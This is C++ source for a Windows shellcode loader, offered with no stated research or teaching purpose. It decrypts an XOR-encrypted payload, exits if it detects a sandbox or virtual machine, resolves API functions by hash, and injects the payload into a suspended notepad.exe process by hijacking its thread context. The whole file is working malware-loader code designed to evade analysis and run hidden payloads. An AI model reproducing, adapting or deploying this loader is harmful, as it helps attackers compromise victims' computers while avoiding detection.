#include <windows.h>
#include <string>
#include <vector>
#include "shellcode.h"

// Hash function for API names
DWORD hash_string(const char* str) {
    DWORD hash = 0x1505;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Function pointer typedefs
typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *GETMODULEHANDLEA)(LPCSTR);
typedef HANDLE (WINAPI *CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef LPVOID (WINAPI *VIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *WRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef DWORD (WINAPI *RESUMETHREAD)(HANDLE);
typedef HANDLE (WINAPI *OPENTHREAD)(DWORD, BOOL, DWORD);
typedef DWORD (WINAPI *SUSPENDTHREAD)(HANDLE);
typedef BOOL (WINAPI *GETTHREADCONTEXT)(HANDLE, LPCONTEXT);
typedef BOOL (WINAPI *SETTHREADCONTEXT)(HANDLE, const CONTEXT*);
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection)(HANDLE, LPVOID);

// Function to resolve API addresses by hash
FARPROC resolve_function_by_hash(DWORD hash) {
    HMODULE modules[] = {
        LoadLibraryA("kernel32.dll")
    };
    const char* functions[] = {
        "GetModuleHandleA",
        "GetProcAddress",
        "CreateProcessA",
        "VirtualAllocEx",
        "WriteProcessMemory",
        "ResumeThread",
        "OpenThread",
        "SuspendThread",
        "GetThreadContext",
        "SetThreadContext",
        "NtUnmapViewOfSection"
    };

    for (HMODULE module : modules) {
        if (!module) continue;
        for (const char* func_name : functions) {
            if (hash_string(func_name) == hash) {
                return GetProcAddress(module, func_name);
            }
        }
    }
    return NULL;
}

// Decrypt shellcode using XOR
void xor_decrypt(unsigned char* data, size_t data_len, unsigned char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; ++i) {
        data[i] ^= key[i % key_len];
    }
}

// Sandbox checks
bool is_sandboxed() {
    // Check for common sandbox filenames
    const char* sandbox_files[] = {
        "C:\\sandbox-detected",
        "C:\\.vmware-toolbox",
        "C:\\vboxguest"
    };
    for (const char* file : sandbox_files) {
        if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }

    // Check for timing anomalies (simple example)
    LARGE_INTEGER start, end, frequency;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);
    Sleep(100);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;
    if (elapsed < 0.09) { // If sleep took too little time, might be in a sandbox
        return true;
    }

    return false;
}

int main() {
    if (is_sandboxed()) {
        return 0; // Exit if sandbox detected
    }

    // Decrypt shellcode
    size_t shellcode_len = sizeof(encrypted_shellcode);
    unsigned char* shellcode = new unsigned char[shellcode_len];
    memcpy(shellcode, encrypted_shellcode, shellcode_len);
    xor_decrypt(shellcode, shellcode_len, key, sizeof(key));

    // Resolve API functions dynamically
    CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)resolve_function_by_hash(hash_string("CreateProcessA"));
    VIRTUALALLOCEX pVirtualAllocEx = (VIRTUALALLOCEX)resolve_function_by_hash(hash_string("VirtualAllocEx"));
    WRITEPROCESSMEMORY pWriteProcessMemory = (WRITEPROCESSMEMORY)resolve_function_by_hash(hash_string("WriteProcessMemory"));
    RESUMETHREAD pResumeThread = (RESUMETHREAD)resolve_function_by_hash(hash_string("ResumeThread"));

    // Create a suspended process (notepad.exe)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!pCreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        delete[] shellcode;
        return 1;
    }

    // Allocate memory in the remote process
    LPVOID remoteMem = pVirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        delete[] shellcode;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // Write shellcode to remote process
    SIZE_T bytesWritten;
    if (!pWriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_len, &bytesWritten) || bytesWritten != shellcode_len) {
        delete[] shellcode;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // Get thread context to modify RIP/EIP
    CONTEXT context;
    context.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &context)) {
        delete[] shellcode;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

#ifdef _M_X64
    context.Rip = (DWORD64)remoteMem;
#else
    context.Eip = (DWORD)remoteMem;
#endif

    // Set thread context to execute shellcode
    if (!SetThreadContext(pi.hThread, &context)) {
        delete[] shellcode;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // Resume thread to execute shellcode
    pResumeThread(pi.hThread);

    // Cleanup
    delete[] shellcode;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}